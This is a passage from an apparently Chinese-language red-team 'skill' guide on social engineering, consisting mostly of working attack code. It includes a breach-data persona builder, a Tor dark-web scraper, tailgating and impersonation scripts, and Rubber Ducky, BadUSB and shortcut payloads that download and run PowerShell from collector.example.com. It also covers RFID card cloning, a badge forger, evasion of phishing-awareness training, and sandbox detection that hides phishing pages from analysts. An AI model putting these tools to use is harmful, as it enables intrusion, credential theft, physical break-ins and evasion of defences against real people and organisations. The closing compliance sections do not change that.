            if record.get('phone'): persona['phones'].add(record['phone'])
            if record.get('username'): persona['usernames'].add(record['username'])
            if record.get('password'): persona['passwords'].add(record['password'])
            if record.get('ip_address'): persona['ips'].add(record['ip_address'])
            if record.get('source'): persona['sources'].add(record['source'])
        for key in ['emails', 'phones', 'usernames', 'passwords', 'ips', 'sources']:
            persona[key] = list(persona[key])
        return persona

# engine = CorrelationEngine()
# for record in breach_data:
#     engine.add_record(record)
# persona = engine.build_persona("target@example.com")
```

### 7.3 知识图谱构建

```bash
# 使用 Neo4j 构建社工知识图谱
docker run -d --name neo4j-se \
  -p 7474:7474 -p 7687:7687 \
  -e NEO4J_AUTH=neo4j/password123 \
  neo4j:5-enterprise

# 导入数据
cypher-shell -u neo4j -p password123 << 'CYPHER'
CREATE CONSTRAINT IF NOT EXISTS FOR (p:Person) REQUIRE p.email IS UNIQUE;
CREATE CONSTRAINT IF NOT EXISTS FOR (o:Organization) REQUIRE o.name IS UNIQUE;
CREATE INDEX IF NOT EXISTS FOR (p:Person) ON (p.phone);
CREATE INDEX IF NOT EXISTS FOR (p:Person) ON (p.username);

LOAD CSV WITH HEADERS FROM 'file:///persons.csv' AS row
CREATE (p:Person {
  email: row.email, username: row.username,
  phone: row.phone, full_name: row.full_name,
  breach_source: row.source
});

MATCH (p1:Person {email: row.email1})
MATCH (p2:Person {email: row.email2})
CREATE (p1)-[:SAME_PERSON {confidence: toFloat(row.confidence)}]->(p2);
CYPHER
```

### 7.4 暗网数据收集

```bash
# Tor 代理配置
# /etc/tor/torrc
SOCKSPort 9050
ControlPort 9051
CookieAuthentication 1

# 启动 Tor
systemctl start tor

# Python 暗网爬虫
python3 << 'PYEOF'
import requests
import time
from stem import Signal
from stem.control import Controller

class DarkWebCollector:
    def __init__(self):
        self.session = requests.Session()
        self.session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0'
        })

    def renew_tor_identity(self):
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(Signal.NEWNYM)

    def search_forums(self, keywords: list, max_pages: int = 5) -> list:
        results = []
        for keyword in keywords:
            for page in range(1, max_pages + 1):
                try:
                    response = self.session.get(
                        f"http://darksearch.onion/api/search",
                        params={"q": keyword, "page": page},
                        timeout=30
                    )
                    if response.status_code == 200:
                        data = response.json()
                        results.extend(data.get('results', []))
                    time.sleep(2)
                except Exception as e:
                    print(f"Error: {e}")
                    self.renew_tor_identity()
                    time.sleep(5)
        return results

    def monitor_breach_listings(self, keywords: list) -> list:
        findings = []
        marketplaces = ["http://market1.onion", "http://market2.onion"]
        for market in marketplaces:
            for keyword in keywords:
                try:
                    response = self.session.get(
                        f"{market}/api/listing/search",
                        params={"q": keyword}, timeout=30
                    )
                    if response.status_code == 200:
                        for listing in response.json():
                            if any(kw.lower() in listing.get('title', '').lower() for kw in keywords):
                                findings.append({
                                    "market": market,
                                    "title": listing.get('title'),
                                    "price": listing.get('price'),
                                    "date": listing.get('date'),
                                    "data_type": listing.get('data_type'),
                                    "records_count": listing.get('records')
                                })
                except Exception:
                    pass
                time.sleep(3)
        return findings

# collector = DarkWebCollector()
# results = collector.search_forums(["breach", "database", "company.com"])
PYEOF
```

---

## 8. 物理社工 (Physical Social Engineering)

物理社工涉及对目标场所的物理访问，通过伪装、尾随等手段获取内部网络访问权限。

### 8.1 尾随攻击 (Tailgating)

```bash
# 尾随攻击工具箱
# 1. 伪装道具: 咖啡杯、外卖袋、大纸箱、烟/打火机
# 2. 尾随时机分析

python3 << 'PYEOF'
"""
尾随攻击时机分析工具
"""
import random

class TailgatingAnalyzer:
    PEAK_HOURS = {
        "morning_arrival": {"start": "07:30", "end": "09:00", "density": "high"},
        "lunch_exit": {"start": "11:30", "end": "12:30", "density": "medium"},
        "lunch_return": {"start": "12:30", "end": "13:30", "density": "medium"},
        "smoke_break": {"start": "10:00", "end": "10:30", "density": "low"},
        "afternoon_smoke": {"start": "15:00", "end": "15:30", "density": "low"},
        "evening_exit": {"start": "17:00", "end": "18:30", "density": "high"},
        "delivery_window": {"start": "09:00", "end": "17:00", "density": "variable"}
    }

    @staticmethod
    def recommend_timing(target_type: str) -> list:
        recommendations = {
            "corporate_office": [
                {"time": "08:15-08:45", "reason": "早高峰人流密集，员工赶时间不留意",
                 "success_rate": 0.85, "cover": "端着咖啡，跟着人群"},
                {"time": "12:15-12:45", "reason": "午餐时间外卖员频繁出入",
                 "success_rate": 0.75, "cover": "拿着外卖袋，假装刚取餐"},
                {"time": "13:00-13:30", "reason": "午休结束返回，多人同时刷卡",
                 "success_rate": 0.80, "cover": "边打电话边跟随"}
            ],
            "tech_campus": [
                {"time": "09:00-10:00", "reason": "弹性工作时间，持续人流",
                 "success_rate": 0.70, "cover": "背着电脑包，看手机"},
                {"time": "14:00-15:00", "reason": "会议时间，访客频繁",
                 "success_rate": 0.65, "cover": "假装参加面试/会议"}
            ],
            "government": [
                {"time": "07:45-08:30", "reason": "统一上班时间，人流集中",
                 "success_rate": 0.50, "cover": "需要更高水平伪装"},
                {"time": "11:00-12:00", "reason": "办事人员进出高峰期",
                 "success_rate": 0.55, "cover": "假装办理业务"}
            ]
        }
        return recommendations.get(target_type, recommendations["corporate_office"])

    @staticmethod
    def generate_cover_story(role: str, building: str) -> str:
        stories = {
            "delivery": f"我是快递员，来送{building}的文件。",
            "interview": f"我来{building}参加面试，HR让我在3楼等。",
            "contractor": f"我是IT外包的，来修{building}的网络设备。",
            "consultant": f"我是{building}请的咨询顾问，第一天来报到。",
            "visitor": f"我来找{building}的张三，他在市场部。",
            "new_employee": f"我是新来的，HR让我今天来办入职。"
        }
        return stories.get(role, stories["visitor"])

# analyzer = TailgatingAnalyzer()
# timing = analyzer.recommend_timing("corporate_office")
# for t in timing:
#     print(f"Time: {t['time']}, Success: {t['success_rate']}, Reason: {t['reason']}")
PYEOF
```

### 8.2 伪装身份 (Impersonation)

```bash
# 伪装身份准备清单
# 1. 服装: IT维修工装/快递公司制服/清洁工制服/安全帽+反光背心
# 2. 道具: 假冒工牌/名片/伪造维修工单
# 3. 社交工程话术

cat > impersonation_scripts.txt << 'EOF'
=== IT支持伪装 ===
"您好，我是总部IT支持中心的。系统检测到您的电脑有安全更新未安装，
需要我远程协助您完成。请问您现在方便吗？"

=== 供应商伪装 ===
"您好，我是XX供应商的技术支持。贵公司采购的打印机墨盒到了，
需要确认一下收货信息。可以告诉我您的工号和部门吗？"

=== 猎头伪装 ===
"您好，我是XX猎头公司的。有一家顶级公司对您的背景很感兴趣，
想了解下您目前的职位和项目情况。"
EOF
```

### 8.3 USB 投递攻击

```bash
# Rubber Ducky 脚本
cat > ducky_payload.txt << 'DUCKY'
REM Rubber Ducky Payload - Authorized Red Team
DELAY 3000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "
STRING $u='https://collector.example.com/payload.ps1';
STRING IEX (New-Object Net.WebClient).DownloadString($u);
STRING "
ENTER
DUCKY

# BadUSB (Arduino Pro Micro)
cat > badusb.ino << 'ARDUINO'
#include <Keyboard.h>
void setup() {
  delay(5000);
  Keyboard.begin();
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("powershell -WindowStyle Hidden -Command \"");
  Keyboard.print("IEX (New-Object Net.WebClient).DownloadString('https://collector.example.com/beacon.ps1')");
  Keyboard.print("\"");
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.end();
}
void loop() {}
ARDUINO

# 恶意快捷方式创建
powershell -Command "
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut('$env:USERPROFILE\Desktop\Confidential_Report.lnk')
$Shortcut.TargetPath = 'powershell.exe'
$Shortcut.Arguments = '-WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString(''https://collector.example.com/payload.ps1'')\"'
$Shortcut.IconLocation = 'C:\Windows\System32\imageres.dll,67'
$Shortcut.Save()
"
```

### 8.4 工作证/门禁卡伪造

```bash
# RFID 门禁卡克隆 (Proxmark3)
proxmark3 /dev/ttyACM0

# 读取低频卡 (125kHz)
lf search
lf read

# 克隆到空白卡
lf hid clone -r 2000000000

# 高频卡 (13.56MHz) - MIFARE Classic
hf search
hf mf autopwn
hf mf dump
hf mf restore

# 打印伪造工牌
python3 << 'PYEOF'
from PIL import Image, ImageDraw, ImageFont
import qrcode
import random

class BadgeForger:
    @staticmethod
    def create_badge(name, title, department, company, photo_path, output_path):
        badge = Image.new('RGB', (600, 400), 'white')
        draw = ImageDraw.Draw(badge)
        draw.rectangle([(0, 0), (600, 60)], fill='#003366')
        draw.text((300, 30), company, fill='white', anchor='mm')
        try:
            photo = Image.open(photo_path).resize((120, 150))
            badge.paste(photo, (30, 80))
        except:
            draw.rectangle([(30, 80), (150, 230)], outline='gray', width=2)
            draw.text((90, 155), 'PHOTO', fill='gray', anchor='mm')
        info_y = 80
        draw.text((180, info_y), f"Name: {name}", fill='black')
        draw.text((180, info_y + 30), f"Title: {title}", fill='black')
        draw.text((180, info_y + 60), f"Department: {department}", fill='black')
        draw.text((180, info_y + 90), f"ID: EMP-{random.randint(10000,99999)}", fill='black')
        qr = qrcode.QRCode(version=1, box_size=3, border=1)
        qr.add_data(f"EMPLOYEE:{name}:{department}:{company}")
        qr.make(fit=True)
        qr_img = qr.make_image(fill='black', back_color='white')
        badge.paste(qr_img.resize((100, 100)), (470, 270))
        badge.save(output_path)
        return output_path

# forger = BadgeForger()
# forger.create_badge("Test User", "IT Support", "Technology", "Target Corp", "photo.jpg", "fake_badge.png")
PYEOF
```---

## 9. 社工防御对抗 (Social Engineering Defense Evasion)

### 9.1 安全培训与钓鱼演练检测

```python
#!/usr/bin/env python3
"""
安全意识培训与钓鱼演练检测与绕过
分析目标组织的安全意识培训模式，生成针对性绕过策略
"""
import re
from typing import Dict

class SecurityTrainingBypass:
    """安全意识培训绕过分析"""

    PHISH_SIMULATION_INDICATORS = [
        r'X-Phish-Test',
        r'X-Phish-Simulation',
        r'X-Security-Test',
        r'X-KnowBe4',
        r'X-Proofpoint-Training',
        r'X-Cofense',
        r'X-PhishMe',
        r'phishlabs\.com',
        r'knowbe4\.com',
        r'proofpoint\.com/simulation',
        r'phishinsight\.trendmicro\.com',
        r'click\.knowbe4\.com',
        r'tracking\.phishme\.com',
        r'links\.cofense\.com',
        r'urldefense\.proofpoint\.com',
        r'This is a phishing simulation',
        r'phishing awareness',
        r'security awareness training',
        r'this is a test',
    ]

    @classmethod
    def detect_phishing_simulation(cls, email_content: str, headers: Dict) -> Dict:
        """检测是否为钓鱼演练"""
        result = {"is_simulation": False, "confidence": 0.0, "detected_indicators": [], "vendor": None}
        header_text = str(headers).lower()
        for indicator in cls.PHISH_SIMULATION_INDICATORS:
            if re.search(indicator, header_text, re.IGNORECASE):
                result["detected_indicators"].append(f"Header: {indicator}")
                result["confidence"] += 0.3
        for indicator in cls.PHISH_SIMULATION_INDICATORS:
            if re.search(indicator, email_content, re.IGNORECASE):
                result["detected_indicators"].append(f"Content: {indicator}")
                result["confidence"] += 0.2
        url_patterns = [
            r'utm_source=phishing', r'utm_medium=simulation',
            r'utm_campaign=security.*test', r'rid=\d+',
            r'recipient_id=\d+', r'user_id=\d+', r'tracking_id=\d+'
        ]
        for pattern in url_patterns:
            if re.search(pattern, email_content, re.IGNORECASE):
                result["detected_indicators"].append(f"URL: {pattern}")
                result["confidence"] += 0.15
        vendor_patterns = {
            'KnowBe4': r'knowbe4', 'Proofpoint': r'proofpoint',
            'Cofense': r'cofense|phishme', 'Mimecast': r'mimecast',
            'Barracuda': r'barracuda.*phish', 'Trend Micro': r'trendmicro.*phish',
            'Microsoft': r'microsoft.*attack.*simulation'
        }
        for vendor, pattern in vendor_patterns.items():
            if re.search(pattern, header_text + email_content, re.IGNORECASE):
                result["vendor"] = vendor
                result["confidence"] += 0.2
                break
        result["is_simulation"] = result["confidence"] >= 0.5
        return result

    @classmethod
    def generate_bypass_strategy(cls, target_org: str) -> Dict:
        """生成针对特定组织的绕过策略"""
        strategies = {
            "high_awareness": {
                "approach": "超个性化",
                "description": "使用高度定制的内容，避免通用模板",
                "techniques": [
                    "使用内部术语和缩写",
                    "引用真实项目名称",
                    "模仿内部邮件格式和签名",
                    "使用目标组织常用的邮件客户端签名",
                    "在正常工作时间发送",
                    "避免使用紧急/威胁性语言",
                    "使用纯文本格式而非HTML",
                    "使用reply-to而非点击链接",
                    "分阶段建立信任，先发送无害邮件"
                ]
            },
            "medium_awareness": {
                "approach": "社交证明",
                "description": "利用同事/上司的社交证明",
                "techniques": [
                    "伪装成已知联系人",
                    "CC内部人员增加可信度",
                    "引用真实对话/会议",
                    "使用内部SharePoint/Teams链接",
                    "模仿IT部门通知格式"
                ]
            }
        }
        return strategies.get("high_awareness", strategies["high_awareness"])

# detector = SecurityTrainingBypass()
# result = detector.detect_phishing_simulation(email_body, email_headers)
# if result["is_simulation"]:
#     print(f"Detected {result['vendor']} simulation with {result['confidence']} confidence")
#     print(f"Indicators: {result['detected_indicators']}")
```

### 9.2 沙箱环境检测对抗

```javascript
/**
 * 沙箱/安全检测环境识别与对抗
 * 检测钓鱼页面是否在安全分析环境中运行
 */
const SandboxDetector = {
    detect: function() {
        const indicators = {
            // 无头浏览器检测
            headless: (function() {
                return navigator.webdriver === true ||
                       /HeadlessChrome/.test(navigator.userAgent) ||
                       !navigator.plugins.length ||
                       navigator.hardwareConcurrency <= 1;
            })(),

            // 虚拟机检测
            vm: (function() {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                if (!gl) return false;
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (!debugInfo) return false;
                const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                return /VMware|VirtualBox|QEMU|Parallels|Microsoft Basic Render/.test(renderer);
            })(),

            // 屏幕分辨率异常
            small_screen: screen.width < 1024 || screen.height < 768,

            // 时区异常
            timezone_offset: new Date().getTimezoneOffset() === 0,

            // 缺少用户交互
            no_interaction: !document.hasFocus() || document.hidden,

            // 自动化工具检测
            automation: (function() {
                return !!window._phantom || !!window.callPhantom ||
                       !!window.__nightmare || !!window.domAutomation ||
                       !!window.emit || !!window.spawn;
            })(),

            // 语言/地区异常
            language_mismatch: (function() {
                const languages = navigator.languages || [navigator.language];
                return !languages.some(l => l.includes('zh') || l.includes('en'));
            })()
        };
        indicators.score = Object.values(indicators).filter(Boolean).length;
        indicators.is_sandbox = indicators.score >= 3;
        return indicators;
    },

    redirect: function() {
        const result = this.detect();
        if (result.is_sandbox) {
            console.log('[SANDBOX DETECTED] Serving benign content');
            window.location.href = 'https://www.google.com';
            return true;
        }
        return false;
    }
};

// if (!SandboxDetector.redirect()) {
//     loadPhishingContent();
// }
```

### 9.3 浏览器指纹伪造

```javascript
/**
 * 浏览器指纹伪造工具
 * 用于规避基于浏览器指纹的检测
 */
const FingerprintSpoofer = {
    spoof: function(profile) {
        // 伪造 User-Agent
        Object.defineProperty(navigator, 'userAgent', {
            get: () => profile.userAgent ||
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        });

        // 伪造硬件并发数
        Object.defineProperty(navigator, 'hardwareConcurrency', {
            get: () => profile.cpuCores || 8
        });

        // 伪造设备内存
        Object.defineProperty(navigator, 'deviceMemory', {
            get: () => profile.memory || 8
        });

        // 伪造平台
        Object.defineProperty(navigator, 'platform', {
            get: () => profile.platform || 'Win32'
        });

        // 伪造语言
        Object.defineProperty(navigator, 'language', {
            get: () => profile.language || 'zh-CN'
        });
        Object.defineProperty(navigator, 'languages', {
            get: () => profile.languages || ['zh-CN', 'zh', 'en-US', 'en']
        });

        // 伪造时区
        const originalDateToString = Date.prototype.toString;
        Date.prototype.toString = function() {
            return originalDateToString.call(this).replace(
                /GMT[+-]\d{4}/,
                profile.timezone || 'GMT+0800'
            );
        };

        // 伪造 WebDriver
        Object.defineProperty(navigator, 'webdriver', { get: () => false });

        // 伪造 Canvas 指纹
        const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;
        HTMLCanvasElement.prototype.toDataURL = function(type) {
            const ctx = this.getContext('2d');
            if (ctx) {
                const imageData = ctx.getImageData(0, 0, this.width, this.height);
                for (let i = 0; i < imageData.data.length; i += 4) {
                    imageData.data[i] += Math.floor(Math.random() * 2);
                }
                ctx.putImageData(imageData, 0, 0);
            }
            return originalToDataURL.apply(this, arguments);
        };
    },

    profiles: {
        'windows_chrome': {
            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            platform: 'Win32', cpuCores: 8, memory: 8,
            language: 'zh-CN', languages: ['zh-CN', 'zh', 'en-US', 'en'],
            timezone: 'GMT+0800'
        },
        'mac_safari': {
            userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
            platform: 'MacIntel', cpuCores: 10, memory: 16,
            language: 'en-US', languages: ['en-US', 'en'],
            timezone: 'GMT-0700'
        },
        'linux_firefox': {
            userAgent: 'Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0',
            platform: 'Linux x86_64', cpuCores: 4, memory: 4,
            language: 'en-US', languages: ['en-US', 'en'],
            timezone: 'GMT+0000'
        }
    }
};

// FingerprintSpoofer.spoof(FingerprintSpoofer.profiles.windows_chrome);
```

---

## 10. 合规与法律边界 (Compliance & Legal Boundaries)

### 10.1 授权测试规范

```yaml
# 红队授权测试规则清单 (Rules of Engagement)
rules_of_engagement:
  authorization:
    - 必须获得书面授权（签署测试授权书）
    - 明确测试范围（IP段、域名、人员范围）
    - 明确测试时间窗口（开始/结束时间）
    - 明确禁止行为（如不可DDoS、不可破坏数据）
    - 紧急联系人信息（24小时联系电话）

  testing_scope:
    - 明确测试目标列表
    - 明确排除的目标（关键业务系统）
    - 明确测试方法限制
    - 明确数据传输/存储要求

  data_handling:
    - 所有收集数据仅用于测试目的
    - 测试结束后按规定销毁数据
    - 数据传输必须加密
    - 不得将数据泄露给第三方
    - 遵守GDPR/个人信息保护法

  communication:
    - 建立加密通信渠道
    - 定期报告测试进展
    - 发现严重漏洞立即报告
    - 测试完成后提交正式报告

  evidence_handling:
    - 保留完整操作日志
    - 截图/录屏记录关键步骤
    - 时间戳记录所有操作
    - 证据链完整性保证
```

### 10.2 红队演练操作规范

```bash
#!/bin/bash
# 红队演练操作日志记录脚本
# 所有操作必须记录，用于证据保留和合规审计

LOGFILE="/var/log/redteam/operations_$(date +%Y%m%d_%H%M%S).log"
mkdir -p /var/log/redteam

log_operation() {
    local action="$1"
    local target="$2"
    local result="$3"
    echo "[$(date -Iseconds)] ACTION=$action TARGET=$target RESULT=$result" >> "$LOGFILE"
}

# 记录所有操作
log_operation "RECON_START" "$TARGET_DOMAIN" "AUTHORIZED"
log_operation "PHISHING_CAMPAIGN" "$TARGET_EMAIL" "LAUNCHED"
log_operation "CREDENTIAL_CAPTURE" "$TARGET_USER" "SUCCESS"
log_operation "ACCESS_OBTAINED" "$TARGET_SYSTEM" "SUCCESS"
log_operation "OPERATION_COMPLETE" "$SCOPE" "ALL_OBJECTIVES_MET"
```

### 10.3 证据保留

```python
#!/usr/bin/env python3
"""
证据链管理工具
确保所有证据的完整性和可追溯性
"""
import hashlib
import json
import os
from datetime import datetime
from typing import Dict, List

class EvidenceChain:
    """证据链管理器"""

    def __init__(self, case_id: str):
        self.case_id = case_id
        self.chain = []
        self.previous_hash = "0" * 64

    def add_evidence(self, filepath: str, description: str, operator: str) -> Dict:
        """添加证据到链上"""
        with open(filepath, 'rb') as f:
            file_hash = hashlib.sha256(f.read()).hexdigest()
        timestamp = datetime.now().isoformat()
        block = {
            "index": len(self.chain),
            "timestamp": timestamp,
            "file": filepath,
            "file_hash": file_hash,
            "description": description,
            "operator": operator,
            "previous_hash": self.previous_hash
        }
        block_string = json.dumps(block, sort_keys=True)
        block["block_hash"] = hashlib.sha256(block_string.encode()).hexdigest()
        self.previous_hash = block["block_hash"]
        self.chain.append(block)
        return block

    def verify_chain(self) -> bool:
        """验证证据链完整性"""
        for i in range(1, len(self.chain)):
            if self.chain[i]["previous_hash"] != self.chain[i-1]["block_hash"]:
                return False
        return True

    def export_chain(self, output_path: str):
        """导出证据链"""
        with open(output_path, 'w') as f:
            json.dump({
                "case_id": self.case_id,
                "chain": self.chain,
                "verified": self.verify_chain(),
                "exported_at": datetime.now().isoformat()
            }, f, indent=2, ensure_ascii=False)

# chain = EvidenceChain("REDTEAM-2026-001")
# chain.add_evidence("screenshot1.png", "Initial reconnaissance", "operator1")
# chain.add_evidence("phishing_email.eml", "Phishing email sent", "operator1")
# chain.export_chain("evidence_chain.json")
```

**证据收集命令**：

```bash
# 屏幕录制
ffmpeg -f x11grab -r 30 -s 1920x1080 -i :0.0 \
  -c:v libx264 -preset ultrafast \
  "/evidence/screen_recording_$(date +%Y%m%d_%H%M%S).mp4"

# 终端操作日志
script -f -q --timing="/evidence/terminal_$(date +%Y%m%d).timing" \
  "/evidence/terminal_$(date +%Y%m%d).log"

# 证据哈希
sha256sum /evidence/* > /evidence/hashes.txt
md5sum /evidence/* >> /evidence/hashes.txt

# 加密证据
gpg --encrypt --recipient redteam@company.com /evidence/redteam_report.json
```

### 10.4 法律边界与免责声明

```yaml
legal_boundaries:
  prohibited_actions:
    - 未经授权访问系统
    - 破坏或篡改目标数据
    - 窃取敏感信息
    - 攻击第三方系统
    - 超出测试范围的操作
    - 使用获得的权限进行非测试操作
    - 在测试结束后保留访问权限
    - 泄露测试过程中获取的任何信息

  compliance_requirements:
    中国法律:
      - 网络安全法
      - 数据安全法
      - 个人信息保护法
      - 刑法第285条/第286条（计算机犯罪）
    国际法规:
      - GDPR (欧盟通用数据保护条例)
      - CCPA (加州消费者隐私法案)
      - CFAA (美国计算机欺诈与滥用法)
      - Computer Misuse Act (英国计算机滥用法)

  mandatory_clauses:
    authorization_letter:
      - "本授权书仅授予在明确范围内进行安全测试的权利"
      - "测试方不得超出授权范围进行任何操作"
      - "测试方必须保护所有接触到的数据"
      - "测试结束后必须删除所有相关数据"
      - "发现严重漏洞必须立即报告"
```

---

## APPENDIX A: 工具速查表

| 类别 | 工具 | 用途 |
|------|------|------|
| 钓鱼平台 | Gophish | 钓鱼活动管理 |
| 钓鱼平台 | Evilginx3 | 反向代理钓鱼 |
| 钓鱼平台 | Modlishka | 反向代理 |
| 邮件测试 | swaks | SMTP 测试工具 |
| 域名分析 | dnstwist | 域名抢注检测 |
| 信息收集 | theHarvester | OSINT 收集 |
| 信息收集 | SpiderFoot | 自动化 OSINT |
| 子域名 | subfinder | 子域名发现 |
| 子域名 | amass | 深度子域名枚举 |
| 浏览器 | BeEF | 浏览器利用框架 |
| 物理攻击 | Proxmark3 | RFID 卡克隆 |
| 物理攻击 | Rubber Ducky | USB 攻击 |
| 社工库 | Maltego | 关联分析 |
| 社工库 | Neo4j | 知识图谱 |
| 语音克隆 | OpenVoice | 语音克隆 |
| AI 社工 | GPT-4o / Claude | AI 钓鱼邮件 |
| 证书 | certbot | Let's Encrypt 证书 |
| 指纹 | FingerprintJS | 浏览器指纹 |

---

## APPENDIX B: 参考资源

1. **NIST SP 800-115** - Technical Guide to Information Security Testing and Assessment
2. **OWASP Social Engineering Testing Guide** - Social engineering testing methodology
3. **PTES (Penetration Testing Execution Standard)** - Standardized penetration testing framework
4. **OSSTMM (Open Source Security Testing Methodology Manual)** - Security testing methodology
5. **MITRE ATT&CK** - T1566 (Phishing), T1589 (Gather Victim Identity Information), T1598 (Phishing for Information)
6. **CWE-350** - Reliance on Reverse DNS Resolution for Authentication
7. **CWE-290** - Authentication Bypass by Spoofing
8. **CWE-345** - Insufficient Verification of Data Authenticity

---

> **END OF SKILL**: This social engineering framework is designed for authorized red team operations and security awareness assessments. All techniques must be used responsibly and within legal boundaries. Unauthorized use may violate applicable laws and regulations.